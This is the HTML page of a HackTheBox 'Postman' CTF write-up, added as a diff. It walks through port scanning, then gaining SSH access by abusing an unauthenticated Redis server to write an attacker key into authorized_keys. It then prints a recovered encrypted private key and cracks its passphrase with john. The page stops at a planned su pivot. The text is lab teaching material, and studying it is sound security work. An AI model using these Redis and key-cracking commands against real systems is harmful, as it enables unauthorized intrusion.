@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Postman was an “easy” rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.   Tl;Dr: The user flag consisted in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Postman">
+<meta property="og:url" content="https://hg8.sh/postman/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Postman was an “easy” rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.   Tl;Dr: The user flag consisted in">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158578-15afb680-9889-11ea-8f61-43fd6bd253f8.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/71326943-07d84e00-2502-11ea-904d-67647430f4dc.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/71326975-af558080-2502-11ea-9618-f52af748ddf7.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/71327015-402c5c00-2503-11ea-871c-0a5321984f47.png">
+<meta property="article:published_time" content="2020-03-13T23:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-18T10:09:27.965Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="gobuster">
+<meta property="article:tag" content="john">
+<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="postman">
+<meta property="article:tag" content="webmin">
+<meta property="article:tag" content="redis">
+<meta property="article:tag" content="cve-2019-12840">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158578-15afb680-9889-11ea-8f61-43fd6bd253f8.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+     
+    <title>HackTheBox - Postman :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/registry/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/bitlab/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/postman/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/postman/&text=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/postman/&is_video=false&description=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Postman&body=Check out this article: https://hg8.sh/postman/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/postman/&name=HackTheBox - Postman&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/postman/&t=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-Redis-gt-Matt"><span class="toc-number">1.2.</span> <span class="toc-text">Pivot Redis -&gt; Matt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-information"><span class="toc-number">3.</span> <span class="toc-text">Additional information</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+       
+        <li><a href="/tags/">Tags</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Postman
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-13T23:00:00.000Z" itemprop="datePublished">14-03-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      11 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="579" alt="postman-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158578-15afb680-9889-11ea-8f61-43fd6bd253f8.png">
+
+<p>Postman was an “easy” rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.  </p>
+<p><strong>Tl;Dr:</strong> The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from <code>redis</code> user to <code>Matt</code> user.<br>Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.</p>
+<p>Alright, let’s get into it!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the host file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.160 postman.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC postman.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 20:34 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">'s Personal Website</span></span><br><span class="line"><span class="string">10000/tcp open  ssl/http MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 46.41 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>We have the “classic”: A web app running on port 80 and the SSH port 22 open. We also have a Webmin server running on port 10000.</p>
+<p>Opening <code>http://postman.htb</code> display the following website:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/71326943-07d84e00-2502-11ea-904d-67647430f4dc.png" alt="postman website"></p>
+<p>While <code>https://postman.htb:10000/</code> display the classical Webmin login page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/71326975-af558080-2502-11ea-9618-f52af748ddf7.png" alt="postman webmin"></p>
+<p>Starting from there….well… There isn’t anything interesting. I run into a lot of rabbit holes without being able to find anything. </p>
+<p>In particularly I tried running exploits against the Webmin instance including the infamous <a href="https://twitter.com/_hg8_/status/1162694712177954819" target="_blank" rel="noopener">CVE-2019-15107 - Remote Code Execution via Password Reset function</a>. But I couldn’t get anything to work nor making progress any progress. </p>
+<p>A piece of the puzzle looked missing to me. When this happen I like to restart my recon process from the beginning, to make sure I didn’t forgot anything.</p>
+<p>Let’s start by re-running <code>nmap</code>, but this time on the top 10,000 ports:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC --top-ports 10000 postman.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 20:39 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 8316 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">'s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn'</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 150.41 seconds</span><br></pre></td></tr></table></figure>
+
+<p>Aah that’s interesting! A new service appeared. A redis instance running on port 6379. That’s probably the missing piece of our puzzle.</p>
+<p>Being new to redis I spent a bit of time reading articles and documentations on redis before starting anything.<br>During my research I stumbled upon this very interesting article: <a href="http://antirez.com/news/96" target="_blank" rel="noopener">“A few things about Redis security”</a>.</p>
+<p>The article, written by one of the redis dev, explain how to “<em>crack Redis for fun and no profit</em>“ on exposed redis instance with no authentication activated.</p>
+<p>Maybe it’s our case ? First, let’s check if the redis instance need authentication:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ telnet postman.htb 6379</span><br><span class="line">Trying 10.10.10.160...</span><br><span class="line">Connected to postman.htb.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Hey no AUTH required!"</span></span><br><span class="line"><span class="variable">$21</span></span><br><span class="line">Hey no AUTH required!</span><br><span class="line">quit</span><br><span class="line">+OK</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
+
+<p>Well, indeed not auth is needed to access this redis instance, that’s good news. Let’s follow the article to see if we can exploit it the same way the author present in his article.</p>
+<p>The next step described in the article is to write our own SSH Public key into <code>~/ssh/authorized_keys</code> in order to gain access to the server.</p>
+<p>First step is to generate a ssh key pair that we will add to the <code>authorized_keys</code> of the server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh-keygen -t rsa -C <span class="string">"hg8@hg8.hg8"</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/hg8/.ssh/id_rsa): ./id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> ./id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> ./id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 hg8@hg8.hg8</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+--[ RSA 2048]----+</span></span><br><span class="line"><span class="string">|          .   O+.|</span></span><br><span class="line"><span class="string">|       . o o..o*o|</span></span><br><span class="line"><span class="string">|      = . + .+ . |</span></span><br><span class="line"><span class="string">|     o B o    .  |</span></span><br><span class="line"><span class="string">|    . o S    E . |</span></span><br><span class="line"><span class="string">|     .        o  |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">+-----------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>I quote the author on this part since he explains way better than me:</p>
+<blockquote>
+<p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; id_rsa_with_nl.pub</span><br></pre></td></tr></table></figure>
+
+<p>Now that we have all the pieces, let’s add our ssh key to the <code>authorized_keys</code> file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 <span class="built_in">echo</span> flushall</span><br><span class="line"><span class="string">"flushall"</span></span><br><span class="line">[hg8@archbook ~]$ cat id_rsa_with_nl.pub | redis-cli -h 10.10.10.160 -x <span class="built_in">set</span> crackit</span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>Then let’s try to login using this generated ssh key:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa redis@postman.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1</span><br><span class="line">redis@Postman:~$</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pivot-Redis-gt-Matt"><a href="#Pivot-Redis-gt-Matt" class="headerlink" title="Pivot Redis -&gt; Matt"></a>Pivot Redis -&gt; Matt</h3><p>Ok, now we have access to the machine with <code>redis</code> user, let’s now find the user to pivot to :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ ls -l /home/Matt/</span><br><span class="line">total 4</span><br><span class="line">-rw-rw---- 1 Matt Matt 33 Aug 26 03:07 user.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>Matt</code> is our user. Let’s do a bit more of recon to see if we can find additional informations.</p>
+<p>While searching around, we find an interesting backup file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:/$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>A private RSA key, we can probably use it to connect to <code>matt</code> account using SSH… Let’s pull this key to work on it offline:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa redis@postman.htb:/opt/id_rsa.bak .</span><br><span class="line">id_rsa.bak  100% 1743    48.1KB/s   00:00</span><br></pre></td></tr></table></figure>
+
+<p>First thing to try login through SSH on <code>Matt</code>‘s’ account with this key:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chmod 600 id_rsa.bak</span><br><span class="line">[hg8@archbook ~]$ ssh -i id_rsa.bak Matt@postman.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa.bak'</span>:</span><br></pre></td></tr></table></figure>
+
+<p>Of course a passphare is needed. Maybe we can bruteforce it? Calling <code>john</code> to the rescue:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa.bak &gt; id_rsa.hash</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (id_rsa.bak)</span><br><span class="line">1g 0:00:00:12 DONE (2019-12-22 21:16) 0.08264g/s 1185Kp/s 1185Kc/s 1185KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>Good, we got a passphrase here! Let’s try to login again:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa.bak Matt@postman.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa.bak'</span>:</span><br><span class="line">Connection closed by 10.10.10.160 port 22</span><br></pre></td></tr></table></figure>
+
+<p>We immediately get a<code>Connection closed</code> error message upon connexion… Seems like we have the right ssh key, the right passphare but the ssh config forbid <code>Matt</code> to connect.</p>
+<p>Let’s confirm those doubts:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line"><span class="comment">#deny users</span></span><br><span class="line">DenyUsers Matt</span><br></pre></td></tr></table></figure>
+
+<p>Alright so <code>Matt</code> is not allowed to SSH, we need to find another way to access his account.</p>
+<p>If <code>Matt</code> reuse password we should be able switch to <code>Matt</code> from <code>Redis</code> user using <code>su</code>…</p>
